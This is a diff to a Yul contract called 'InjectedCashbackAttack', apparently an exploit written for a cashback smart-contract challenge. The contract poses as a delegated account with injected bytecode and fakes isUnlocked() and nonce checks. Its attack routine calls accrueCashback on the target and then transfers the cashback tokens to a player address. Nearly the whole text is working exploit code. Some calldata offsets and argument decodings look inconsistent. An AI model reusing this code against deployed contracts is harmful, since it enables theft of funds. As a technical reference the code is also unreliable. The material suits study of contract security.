@@ -9,46 +9,71 @@ object "InjectedCashbackAttack" {
         code {
             // Code we want to inject to masquerade as the deletegated contract
             // Cashback contract addr: 0xdCc409Af2566c47F6DA4d30Eae8155b332A64078
-            verbatim_0i_0o(hex"603056dCc409Af2566c47F6DA4d30Eae8155b332A64078000000000000000000000000000000000000000000000000005B")
+            verbatim_0i_0o(hex"603756dCc409Af2566c47F6DA4d30Eae8155b332A6407800000000000000000000000000000000000000000000000000000000000000005B")
 
             // protection against sending Ether
             require(iszero(callvalue()))
 
             // dispatchers
             switch selector()
-            case 0x3c5ab959 { // attack(address, address, address, uint256)
+            case 0x61bd21b2 { // attack(address, address, address, uint256, uint256)
                 let cashbackAddr := decodeAsAddr(0)
                 let player := decodeAsAddr(1)
                 let currency := decodeAsAddr(2)
-                let amount := decodeAsUint(3)
+                let currencyId := decodeAsUint(2)
+                let expenseAmt := decodeAsUint(3)
+                let cashbackAmt := decodeAsUint(4)
 
                 // free memory pointer
                 let ptr := mload(0x40)
-
-                // 1. function selector
-                let sel := mload(dataoffset("accrueCashbackSel"))
-                mstore(ptr, shl(224, sel)) // left-shift (256 - 32) bits
+                datacopy(ptr, dataoffset("accrueCashbackSel"), 4)
                 mstore(add(ptr, 4), currency)
-                mstore(add(ptr, 36), amount)
-
+                mstore(add(ptr, 36), expenseAmt)
                 // total calldata size = 4 (selector) + 32 bytes (addr) + 32 bytes (uint256) = 68
+                let calldataSize := 68
+
+                // Calling cashback.accrueCashback()
                 let success := call(
                     gas(),
                     cashbackAddr,
                     0,      // no ETH
                     ptr,    // calldata start
-                    68,     // calldata size
+                    calldataSize, // calldata size
                     0,      // output buffer
                     0       // output length
                 )
-
                 require(success)
+
+                // Calling safeTransferFrom(address,address,uint256,uint256,bytes)
+                // cashback.safeTransferFrom(address(this), player, nativeAmt, CurrencyLibrary.NATIVE_CURRENCY.toId(), "");
+                ptr := mload(0x40)
+                datacopy(ptr, dataoffset("safeTransferFromSel"), 4)
+                mstore(add(ptr, 4), cashbackAddr)  // contract
+                mstore(add(ptr, 36), player)       // player
+                mstore(add(ptr, 98), cashbackAmt)
+                mstore(add(ptr, 130), currencyId)  // currencyId
+                mstore(add(ptr, 162), 0)
+                calldataSize := 194
+
+                success := call(
+                    gas(),
+                    cashbackAddr,
+                    0,      // no ETH
+                    ptr,    // calldata start
+                    calldataSize,
+                    0,      // output buffer
+                    0       // output length
+                )
+                require(success)
+
+                return (0, 0)
             }
             case 0x8380edb7 { // isUnlocked()
                 returnTrue()
             }
             case 0xf360c183 { // setNonce(uint256)
                 setNonce(decodeAsUint(0))
+                return(0, 0)
             }
             case 0x34b15118 { // consumeNonce()
                 returnUint(nonce())
@@ -102,30 +127,12 @@ object "InjectedCashbackAttack" {
             }
 
             /* ------- utility functions ------- */
-            function getNativeAmt() -> v {
-                let max := mload(dataoffset("NATIVE_MAX_CASHBACK"))
-                let rate := mload(dataoffset("NATIVE_CASHBACK_RATE"))
-                let bp := mload(dataoffset("BASIS_POINT"))
-                v := div(mul(max, rate), bp)
-            }
-
             function require(condition) {
                 if iszero(condition) { revert(0, 0) }
             }
         } // end of code
 
-        // constant used
-        data "BASIS_POINT"          hex"2710"
-
-        data "NATIVE_MAX_CASHBACK"  hex"0de0b6b3a7640000"
-        data "NATIVE_CASHBACK_RATE" hex"32"
-
-        data "FREEDOM_MAX_CASHBACK" hex"1b1ae4d6e2ef500000"
-        data "FREEDOM_CASHBACK_RATE" hex"c8"
-
-        data "NativeCurrency"       hex"EeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE"
-        data "FreedomCoin"          hex"13aaf3218facf57cfbf5925e15433307b59bcc37"
-
         data "accrueCashbackSel"    hex"ebc39613"
+        data "safeTransferFromSel"  hex"f242432a" // safeTransferFrom(address,address,uint256,uint256,bytes)
     }
 }
